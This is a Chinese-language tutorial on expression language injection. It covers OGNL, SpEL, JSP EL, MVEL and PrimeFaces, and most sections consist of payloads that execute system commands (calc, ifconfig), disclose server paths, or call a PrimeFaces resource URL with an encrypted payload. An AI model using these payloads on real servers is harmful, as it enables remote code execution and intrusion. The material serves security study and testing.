# 表达式注入简介

> 2013年4月15日Expression Language Injection词条在OWASP上被创建，而这个词的最早出现可以追溯到2012年12月的《Remote-Code-with-Expression-Language-Injection》一文，在这个paper中第一次提到了这个名词。

> 而这个时期，只不过还只是把它叫做远程代码执行漏洞、远程命令执行漏洞或者上下文操控漏洞。像Struts2系列的s2-003、s2-009、s2-016等，这种由OGNL表达式引起的命令执行漏洞。

> 随着Expression Language越来越广泛的使用，它的受攻击面也随着展开，所以我们觉得有必要开始针对这种类型的漏洞进行一些研究，Expression Language Injection在将来甚至有可能成为SQL注入一样的存在。

| Name | Injection |
|  ----  | ----  |
| Struts2  | OGNL |
| Spring  | SPEL |
| JSP  | JSTL_EL |
| Elasticsearch  | MVEL |

# 表达式注入实例

## Struts2 ——OGNL

### 基本介绍

Strust2漏洞可谓是从一开始就高危到现在，一开始归类为命令执行，现在规范化为表达式注入，其表达式格式为

```
  @[类名]@[方法名|值]
```

举例来说

```java
@java.lang.String@format('foo %s', 'test')
```

### 基本用法

```java
ActionContext AC = ActionContext.getContext();
Map Parameters = (Map)AC.getParameters();
String expression = "${(new java.lang.ProcessBuilder('calc')).start()}";
AC.getValueStack().findValue(expression));
```

相关漏洞有`s2-015`、`s2-016`，`s2-017`等等



## Spring——SPEL

SPEl为Spring框架的EL表达式，只在Spring框架中可用

### 基本用法

```java
java
String expression = "T(java.lang.Runtime).getRuntime().exec(/"calc/")";
String result = parser.parseExpression(expression).getValue().toString();
```

## JSP——JSTL_EL

JSTL_EL为JSP自带的表达式，适用于所有的Java Web

### 基本用法

```jsp
jsp  
<spring:message text=
"${/"/".getClass().forName(/"java.lang.Runtime/").getMethod(/"getRuntime/",null).invoke(null,null).exec(/"calc/",null).toString()}">
</spring:message> 
```

### 相关漏洞

> ```
> CVE-2011-2730
> ```

## Elasticsearch——MVEL

实例有CVE-2014-3120等，MVEL同OGNL和SPEL一样，具有通过表达式执行Java代码的强大功能

### 基本用法

```java
java import org.mvel.MVEL;  
public class MVELTest {  
        public static void main(String[] args) {  
              String expression = "new java.lang.ProcessBuilder(/"calc/").start();";  
               Boolean result = (Boolean) MVEL.eval(expression, vars);  
         }  
  } 
```

## Primefaces框架

### 验证代码

```java
${facesContext.getExternalContext().getResponse().getWriter().println("~~~elinject~~~")}${facesContext.getExternalContext().getResponse().getWriter().flush()}${facesContext.getExternalContext().getResponse().getWriter().close()}
```

### Web路径

```java
${facesContext.getExternalContext().getResponse().getWriter().println(request.getSession().getServletContext().getRealPath(/"//"))}${facesContext.getExternalContext().getResponse().getWriter().flush()}${facesContext.getExternalContext().getResponse().getWriter().close()}
```



### 加密后的Payload

```
uMKljPgnOTVxmOB%2BH6%2FQEPW9ghJMGL3PRdkfmbiiPkV9XxzneUPyMM8BUxgtfxF3wYMlt0MXkqO5%2BOpbBXfBSCSkb2z5x8Cb2P%2FDS2BUn7odA0GflWHV%2B9J8uLGYIqPK9HY85O%2BJw0u5X9urorJfQZKJihsLCV%2BnqyXHs8i6uh4iIboLA2TZUiTbjc3SfybUTvPCjRdyT6rCe6MPQGqHYkBiX3K7fGPuwJ2XNONXI9N2Sup5MWcUUo87FbX3jESvOq2Bs3sDKU4bW3aCGbhUcA2ZEgSxkLcW6VKDnXV5hxvz6J4a4E6P8HCy9v8%2BdrRzmtKbwczXk%2B9n8Lm2KYS%2Fk2TJKpeKjPg0t%2BAiKzTiqak%3D
```

### 调用Payload

```
http://xx.xx.xx.xx/javax.faces.resource/?pfdrt=sc&;ln=primefaces&;pfdrid=1acBqv16SJhfc30NLxL/NinZaDI%2BoHqk1xDbSI8qOl4%2BoXsKFyqJq3gv2IBc1S89q6G1POSSKDNlzHE/%2BnsMuZgTDALpyOstkBkFVJNc2U/B%2BoceOqnpF5YZoWtF0W7qGxsImsumut7GQoKKMQcbwwL4coE07x6Mn09hfy94tuiiy6S8S1vr8kPPYzrUC5AveiE9ls7dLDiaQripnC0Z71fB1xCjkxw8wjZt3om1PT9Wq8YAqkHuBIo/soFBvM1YDnJosELhjmfoJdAGBRfullXUfVw5xEg9ykFpLaKugkbDIBgXtv58Xu4BrT0d5MAQ8BOVwjzSodkdllYCAeUklCDWRfFtZDORdcAzXVxTRkEn%2Bnx7qAFh8NwK/sDsXz6U1Q2Q/ny1UaEMFM9qrgVmfX181HXWc4TuETxLqUohfreYLJLW%2BAxcxzciqqoKj%2Bht/KJ%2B%2BGfzuNoSs0E9i9N/AL5PALrdTRg%2BuweD3CMLZgLDITkMx4z7dmP2daw2B98nrKOLHtG6nYDcDmSfy8d8IKMZJvuq/WT7JLm0PJ3UqDyvzHHjrPCDpTFhMUmftFFvi4APBpT41slHYoRKDbJMvU/upvKyAsy5xQKJ5s6x%2B4F%2By9p8Icp1TQfMcqIPwMQkvsOs8i61m6i96dpmxpfZPWprcigaWMhJG8/iYRg7ZygegrmSbovLy5Tr3Mc9GODgdTx7v396NJ75yQyU4ETmYEhNxWTIoncK7MbyBcIWR/h1GjhCwwpquKRWLb3hal8DNJxubaKnxGa9mRNaQAZRr0s%2B3eo1jeino5O8CSQzla7ACpJc3867AAGxnWrnE/weJ20W3QKj6nIz/EAyx87aVIKs%2BQH3O4IGx%2BuiZ38TvMeg6jZpkZGiRNEUEuAoV6CWlMA%2BxM6BPvbPyWsqmdI8l%2ByFBhsoSpNhel2%2B0gxS5wWqZbRyi0rjPlOzUe8Xir9mlpuBZzrUIcbaYaE8PHQno1OZ/zaHx/GzAJakSRQ5YbKQ/W/OzkokDG3M79KSCtx2jN92PtISucY%3D&;cmd=ifconfig
```



